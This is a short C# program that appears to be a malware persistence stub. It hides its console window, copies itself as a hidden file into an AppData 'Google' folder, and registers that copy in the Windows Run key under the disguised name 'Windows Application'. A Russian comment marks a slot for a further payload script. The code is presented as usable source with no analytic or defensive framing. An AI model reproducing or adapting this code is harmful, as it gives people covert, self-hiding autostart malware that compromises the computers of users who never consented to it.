using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace reflection
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("kernel32.dll")]
        public static extern void ExitProcess([In] uint uExitCode);
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private static void Main()
        {

            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            Console.SetWindowSize(1, 1);
            var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Google",
                AssemblyProduct);
            if (!File.Exists(fileName))
            {
                File.Copy(AssemblyProduct, fileName);
                File.SetAttributes(fileName, FileAttributes.Hidden);
            }
            var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
            if (key != null) key.SetValue("Windows Application", fileName);
            Method();
        }
        private static void Method()
        {
            // сюда кидаем скрипт замены имени процессора 
            ExitProcess(0);
        }
        public static string AssemblyProduct
        {
            get
            {
                var attributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyProductAttribute), false);
                return attributes.Length == 0 ? "" : ((AssemblyProductAttribute)attributes[0]).Product + ".exe";
            }
        }

    }
    public class IAssembly
    {
        public const string Title = "reflection";
        public const string Description = "";
        public const string Configuration = "";
        public const string Company = "";
        public const string Product = "reflection";
        public const string Copyright = "Copyright ©  2016";
        public const string Trademark = "";
        public const string Culture = "";
        public const string Version = "1.0.0.0";
    }
}
